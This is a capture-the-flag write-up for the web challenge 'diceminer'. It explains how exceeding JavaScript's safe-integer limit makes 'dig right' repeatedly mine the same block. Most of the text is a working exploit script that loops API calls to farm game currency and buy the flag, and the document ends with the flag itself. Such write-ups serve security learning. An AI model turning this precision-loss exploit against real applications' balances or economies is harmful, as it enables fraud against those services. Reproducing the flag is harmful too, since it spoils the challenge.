# web - diceminer

-Start the game at 9007199254740991: This places you right on the edge of the precision loss.

-Dig Down: This safely clears a vertical shaft (e.g., 9007199254740991, 0) and mines the blocks below you.

-Move Down: Step into the newly cleared space.

-Dig Right: On the very first iteration, cx becomes 9007199254740992 (which is unmined). On the second iteration, cx + 1 remains 9007199254740992 due to precision loss. Boom! Infinite loop on an unmined block.


```
async function pwn() {
  const MAX_SAFE = 9007199254740991;
  
  // 1. Start at the edge of precision loss
  await fetch('/api/start', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({ x: MAX_SAFE })
  });

  let y = 1;
  let balance = 0;

  console.log("Starting the grind...");

  while (balance < 1000000) {
    // 2. Dig down to clear the path below us
    await fetch('/api/dig', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({ direction: 'down' })
    });

    // 3. Move down into the cleared block
    y -= 1;
    await fetch('/api/move', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({ moves: [{ x: MAX_SAFE, y: y }] })
    });

    // 4. Dig right to trigger the precision loss exploit
    let res = await fetch('/api/dig', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({ direction: 'right' })
    });
    
    let data = await res.json();
    balance = data.balance || balance;
    console.log(`Depth: ${y} | Balance: ${balance}`);

    // Upgrade pickaxes as soon as we can afford them for a larger multiplier
    if (balance >= 5000) await buyPickaxe(3); // Gold
    else if (balance >= 500) await buyPickaxe(2); // Iron
    else if (balance >= 100) await buyPickaxe(1); // Stone
  }

  // 5. Buy the flag!
  let flagRes = await fetch('/api/buy', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({ item: 'flag' })
  });
  
  let flagData = await flagRes.json();
  console.log('🎉 Pwned! Flag:', flagData.flag);
}

async function buyPickaxe(tier) {
  await fetch('/api/buy', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({ item: tier.toString() })
  });
}

pwn();
```
flag:`dice{first_we_mine_then_we_cr4ft}`

Compiled by: yappare
Solved by: Ha1qal